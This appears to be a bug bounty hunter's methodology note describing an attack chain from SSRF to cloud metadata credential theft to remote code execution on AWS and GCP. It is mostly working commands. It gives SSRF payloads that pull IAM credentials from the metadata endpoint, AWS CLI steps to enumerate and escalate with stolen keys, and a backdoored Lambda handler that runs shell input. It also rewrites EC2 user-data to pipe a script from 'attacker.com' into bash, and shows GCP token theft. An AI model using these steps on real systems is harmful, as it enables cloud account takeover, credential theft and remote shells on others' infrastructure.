---
tags: [bugbounty, chain, ssrf, rce, p1, cloud]
aliases: [SSRF to RCE, SSRF Chain]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Chain: SSRF → Cloud Metadata → RCE

> [!tldr] Chain Summary
> SSRF bug → hit cloud metadata → steal IAM credentials → full AWS/GCP access → RCE via Lambda/EC2.
> **Severity uplift:** SSRF (P3) → RCE/Cloud takeover (P1)
> **Prerequisites:** SSRF that returns response body; target runs on AWS/GCP/Azure.

---

## Full Chain

```
[SSRF discovered]
      ↓
[Confirm OOB hit with interactsh]
      ↓
[Try cloud metadata endpoint]
http://169.254.169.254/latest/meta-data/
      ↓
[Get IAM role name]
http://169.254.169.254/latest/meta-data/iam/security-credentials/
      ↓
[Get temporary credentials]
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
      ↓
[Configure AWS CLI with stolen creds]
aws configure --profile stolen
      ↓
[Enumerate permissions]
aws iam get-role-policy / list-attached-role-policies
aws sts get-caller-identity
      ↓
[Escalate to full access]
EC2 → SSM Session Manager → shell
Lambda → update function code → RCE
S3 → find code/config → more secrets
      ↓
[Report: SSRF → Cloud ATO → RCE]
```

---

## Step 1 — Verify SSRF returns body

```bash
# Must get response body, not just OOB ping
curl "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/"
# Look for: ami-id, instance-id, etc. in response
```

## Step 2 — Get IAM credentials

```bash
# Step A: List roles
SSRF payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response: "MyEC2Role"

# Step B: Get credentials  
SSRF payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
# Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-04-21T10:00:00Z"
}
```

## Step 3 — Configure and enumerate

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Who am I?
aws sts get-caller-identity

# What can I do?
aws iam list-attached-role-policies --role-name MyEC2Role
aws iam get-role-policy --role-name MyEC2Role --policy-name POLICY

# Common high-impact permissions:
# ec2:* → full EC2 control
# lambda:* → inject code into Lambda functions
# s3:* → read all buckets
# iam:* → create admin users
# secretsmanager:* → read all secrets
```

## Step 4 — Achieve RCE

### Via EC2 SSM (if ssm:StartSession allowed)
```bash
aws ssm start-session --target INSTANCE_ID
# Interactive shell on EC2 instance
```

### Via Lambda code injection (if lambda:UpdateFunctionCode allowed)
```bash
# Create a backdoor Lambda zip
echo 'import os; def handler(e,c): return os.system(e.get("cmd","id"))' > lambda.py
zip lambda.zip lambda.py

# Update existing function
aws lambda update-function-code --function-name TARGET_FUNCTION \
  --zip-file fileb://lambda.zip

# Invoke to get RCE
aws lambda invoke --function-name TARGET_FUNCTION \
  --payload '{"cmd": "id"}' /tmp/output.json
cat /tmp/output.json
```

### Via EC2 user-data modification (if ec2:ModifyInstanceAttribute allowed)
```bash
# Stop instance, modify user-data with reverse shell, start
aws ec2 stop-instances --instance-ids i-XXXXX
aws ec2 modify-instance-attribute --instance-id i-XXXXX \
  --user-data '#!/bin/bash
curl -s http://attacker.com/shell | bash'
aws ec2 start-instances --instance-ids i-XXXXX
```

---

## GCP Variant

```bash
# GCP metadata
SSRF: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header required: Metadata-Flavor: Google (test if target app adds it)

# Get OAuth token
{
  "access_token": "ya29.XXX",
  "expires_in": 3599,
  "token_type": "Bearer"
}

# Use token
curl -H "Authorization: Bearer TOKEN" https://cloudresourcemanager.googleapis.com/v1/projects
curl -H "Authorization: Bearer TOKEN" https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID
```

---

## Impact Statement for Report

```
**Vulnerability:** Server-Side Request Forgery leading to AWS credential theft and Remote Code Execution

**Chain:**
1. SSRF at POST /api/preview?url= allows server-side HTTP requests
2. Metadata endpoint at 169.254.169.254 returns AWS IAM credentials for role "AppEC2Role"  
3. Credentials have ec2:* permissions — SSM session started on EC2 instance i-XXXXX
4. Interactive shell obtained on production EC2 instance running as root

**Impact:** Full compromise of AWS environment, access to all S3 data, ability to persist access and pivot to other services.

**CVSS:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H — 10.0 Critical
```

---

## References

- Orange Tsai SSRF talks
- HackTricks SSRF → RCE — https://book.hacktricks.xyz/cloud-security/pentesting-cloud/aws-security
- pacu — AWS post-exploitation framework
